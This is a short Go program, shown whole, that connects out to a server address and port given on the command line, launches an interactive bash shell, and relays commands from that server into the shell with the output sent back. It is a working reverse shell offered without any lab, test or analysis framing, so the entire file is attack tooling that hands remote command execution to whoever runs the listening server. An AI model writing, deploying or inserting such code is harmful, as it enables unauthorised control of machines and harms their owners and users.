package main

import "log"
import "os/exec"
import "os"
import "fmt"
import "bufio"
import "net"
import "io"

func InitConnection(serverAddr string, serverPort string, requests chan<- string, response <-chan string) {
    var server = fmt.Sprintf("%s:%s", serverAddr, serverPort)
    fmt.Println("Connecting to remote server...", server)
    conn, err := net.Dial("tcp", server)
    if err != nil {
        log.Fatalln(err)
    }
    fmt.Println("Connection established!")

    go func() {
        for {
            for resp := range response {
                fmt.Fprintf(conn, "Response: " + resp)
            }
        }
    }()

    for {
        text, err := bufio.NewReader(conn).ReadString('\n')
        if err != nil {
            log.Fatalln(err)
        }
        requests<- text
    }

    log.Fatalln("connection closed!")
}

func IOHandler(requests <-chan string, response chan<- string, stdin io.WriteCloser, stdout io.ReadCloser, stderr io.ReadCloser) {
    defer stdin.Close()
    defer stdout.Close()
    defer stderr.Close()

    outReader := bufio.NewReader(stdout)
    outScanner := bufio.NewScanner(outReader)

    errReader := bufio.NewReader(stderr)
    errScanner := bufio.NewScanner(errReader)

    go func(){
        for outScanner.Scan() {
            response<- outScanner.Text() + "\n"
        }
        for errScanner.Scan() {
            response<- "ERROR!!! : " + errScanner.Text() + "\n"
        }
    }()

    for {
        log.Println("Waiting command...")
        req := <-requests

        if ( req == "@stop\n" ) {
            log.Fatalln("Stop command received, terminating self...")
        }

        log.Println("request accepted...")
        io.WriteString(stdin, req)
        log.Println("new circle")
    }

}

func MakeBash(requests <-chan string, response chan<- string) {
    fmt.Println("Starting bash... Press @stop to exit.")
    cmd := exec.Command("bash", "-i")

    stdin, err := cmd.StdinPipe()
    if err != nil {
        log.Fatalln(err)
    }

    stdout, err := cmd.StdoutPipe()
    if err != nil {
        log.Fatalln(err)
    }

    stderr, err:= cmd.StderrPipe()
    if err != nil {
        log.Fatalln(err)
    }

    go IOHandler(requests, response, stdin, stdout, stderr)

    if err := cmd.Start(); err != nil {
        log.Fatalln(err)
    }
    cmd.Wait()
}

func main() {
    if len(os.Args) < 3 {
        log.Fatalln("You must set server ip and port as arguments!")
    }

    var serverAddr = os.Args[1]
    var serverPort = os.Args[2]


    var chan_requests chan string = make(chan string)
    var chan_response chan string = make(chan string)

    go MakeBash(chan_requests, chan_response)
    InitConnection(serverAddr, serverPort, chan_requests, chan_response)
}
